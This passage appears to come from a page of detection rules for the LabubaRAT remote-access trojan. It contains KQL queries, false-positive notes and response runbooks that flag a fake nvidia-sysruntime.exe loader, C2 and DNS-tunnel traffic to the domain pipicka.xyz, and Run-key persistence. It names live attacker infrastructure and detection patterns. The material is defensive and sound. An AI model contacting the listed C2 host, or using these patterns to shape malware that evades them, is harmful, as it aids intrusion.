  • A benign internal tool coincidentally named nvidia-sysruntime.exe (rare — no legit NVIDIA product uses this name)
  • Base64 regex firing on a legitimate long argument if a same-named benign binary exists
Suppression filter
| where not(FolderPath has @"\NVIDIA" and InitiatingProcessVersionInfoCompanyName =~ "NVIDIA Corporation")
Response runbook
1) Triage: pull the full ProcessCommandLine and decode any Base64 argument to recover the C2 host/polling interval; confirm the binary is NOT signed by NVIDIA Corporation and sits outside \Program Files\NVIDIA. 2) Contain: isolate the host, kill the nvidia-sysruntime.exe process tree, and block pipicka.xyz plus any decoded C2 host at the proxy/firewall. 3) Hunt: search the org for the same SHA256, for the local SQLite config DB dropped by the loader, for Run-key persistence referencing the binary, and for outbound sessions to the decoded C2 over HTTPS/DNS.

| where FileName =~ "nvidia-sysruntime.exe" or InitiatingProcessFileName =~ "nvidia-sysruntime.exe"
| where ProcessCommandLine has "pipicka.xyz" or ProcessCommandLine matches regex @"[A-Za-z0-9+/]{40,}={0,2}"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine

| order by TimeGenerated desc

nvidia-sysruntime.exe masquerade — NVIDIA name without NVIDIA signature/path AIExploitation Medium
Catches the LabubaRAT loader independent of its C2 config by flagging any process named nvidia-sysruntime.exe whose signer/company is not NVIDIA Corporation or that runs outside a genuine NVIDIA install path. This survives infrastructure rotation (MaaS operators reuse the same compiled binary with different C2), where the domain-based rules would miss. Rationale: Pivots on the article's exact masquerade — a binary impersonating NVIDIA's container runtime toolkit — using name plus company-name/path mismatch so it fires even when MaaS operators swap the C2 domain. Single-source article; behaviourally sound because no genuine NVIDIA product ships nvidia-sysruntime.exe.
ATT&CKT1036.005
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Custom internal packaging that places an NVIDIA-related helper outside the standard NVIDIA directory
  • Portable-app or extracted-installer staging where a legit NVIDIA tool runs from Temp before install
  • Analyst copying a suspected sample to a Desktop/Downloads folder for review
  • Version-info absent on a legitimately unsigned in-house utility coincidentally named the same way
Suppression filter
| where SHA256 !in (dynamic([]))  // seed with confirmed-benign hashes after first triage
Response runbook
1) Triage: verify the digital signature and VersionInfo — a genuine NVIDIA binary is signed by NVIDIA Corporation; capture the SHA256 and folder path. 2) Contain: if unsigned or signer mismatch, isolate the host and quarantine the file; preserve the on-disk SQLite config DB for the C2 details. 3) Hunt: sweep the fleet for the same SHA256 and for the file name in Downloads/Temp/AppData, and correlate with Run-key persistence and outbound HTTPS/DNS to any new domain from that process.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "nvidia-sysruntime.exe"
| where (ProcessVersionInfoCompanyName != "NVIDIA Corporation" or isempty(ProcessVersionInfoCompanyName)) or not(FolderPath has @"\NVIDIA")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FolderPath, ProcessVersionInfoCompanyName, ProcessVersionInfoProductName, SHA256, ProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\nvidia-sysruntime.exe"
| where NewProcessName !contains "\\NVIDIA"
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

LabubaRAT C2 beacon / DNS tunnel to pipicka.xyz AICommand & Control High
Detects host communication with the LabubaRAT C2 domain pipicka.xyz across any channel — HTTPS connection, DNS resolution, or the high-volume subdomain queries characteristic of its DNS-tunneling fallback. Independent network-layer confirmation of an active foothold. Rationale: Uses the article's confirmed C2 IOC pipicka.xyz across DNS and network telemetry, and adds a distinct-subdomain count to surface the DNS-tunneling channel the article calls out. Single-source (Blackpoint Cyber via THN); domain-match FP risk is minimal for a freshly-registered attacker domain.
ATT&CKT1071.001 T1071.004 T1572
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel or sandbox platform proactively resolving pipicka.xyz for enrichment
  • Security researcher browsing the C2 during analysis
  • A blocklist/passive-DNS scanner in the environment querying the domain
  • Corporate DNS resolver logging the query on behalf of an isolated sample VM
Suppression filter
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe") or InitiatingProcessFileName =~ "nvidia-sysruntime.exe"
Response runbook
1) Triage: identify the ClientIP/host and the process making the query (ContextImageFileName / InitiatingProcessFileName) — confirm it is nvidia-sysruntime.exe or an unsigned binary; check for high distinct-subdomain counts indicating tunneling. 2) Contain: sinkhole/block pipicka.xyz and all subdomains at DNS and proxy, then isolate the querying host. 3) Hunt: pull all resolved IPs for the domain and pivot on other hosts contacting them; look for the loader process, SQLite config, screenshot/file-transfer activity, and SOCKS5 listener behaviour on the same host.
union
(DeviceNetworkEvents
 | where Timestamp > ago(30d)
 | where RemoteUrl has "pipicka.xyz"
 | project Timestamp, DeviceName, Channel="Network", InitiatingProcessFileName, InitiatingProcessCommandLine, Indicator=RemoteUrl, RemoteIP, RemotePort),
(DeviceEvents
 | where Timestamp > ago(30d)
 | where ActionType == "DnsQueryResponse"
 | where AdditionalFields has "pipicka.xyz"
 | project Timestamp, DeviceName, Channel="DNS", InitiatingProcessFileName, InitiatingProcessCommandLine, Indicator=RemoteUrl, RemoteIP="", RemotePort=int(null))
| order by Timestamp desc
DnsEvents
| where TimeGenerated > ago(30d)
| where Name endswith "pipicka.xyz"
| summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), QueryCount=count(), DistinctSubdomains=dcount(Name) by ClientIP, Computer
| order by DistinctSubdomains desc

LabubaRAT user-level autostart persistence referencing nvidia-sysruntime.exe AIInstallation High
Detects LabubaRAT establishing its described user-level autostart by writing a Run-key value that points at nvidia-sysruntime.exe. Registry-layer confirmation of persistence, distinct from the execution and network pivots. Rationale: Combines the article's exact loader name with the described user-level autostart behaviour, matched at the Run-key write. A Run value pointing to a fake nvidia-sysruntime.exe is unambiguous. Single-source (Blackpoint Cyber via THN).
ATT&CKT1547.001
Data sourcesEndpoint.Registry
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Analyst restoring a captured Run key on a lab host during reverse engineering
  • Backup/imaging tooling replaying a registry hive that contains the malicious value
  • EDR remediation tooling re-writing then removing the value during cleanup (transient)
  • Detonation VM where the value is intentionally re-created for behavioural analysis
Response runbook
1) Triage: confirm the Run value data resolves to a non-NVIDIA-signed nvidia-sysruntime.exe and note whether it is under HKCU (user) or HKLM; capture the writing process. 2) Contain: delete the Run value, quarantine the referenced binary and its SQLite config DB, and isolate the host. 3) Hunt: fleet-wide sweep for the same Run value name/data and for the loader binary, then correlate with C2 traffic to pipicka.xyz and any decoded C2 host to scope all enrolled agents in this MaaS deployment.
DeviceRegistryEvents
| where Timestamp > ago(30d)
| where ActionType in ("RegistryValueSet","RegistryKeyCreated")
| where RegistryKey has @"CurrentVersion\Run"
| where RegistryValueData has "nvidia-sysruntime.exe"
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImRegistryEvent
| where TimeGenerated > ago(30d)
| where RegistryKey has "CurrentVersion\\Run"
| where RegistryValueData has "nvidia-sysruntime.exe"
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey, RegistryValue, RegistryValueData, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc
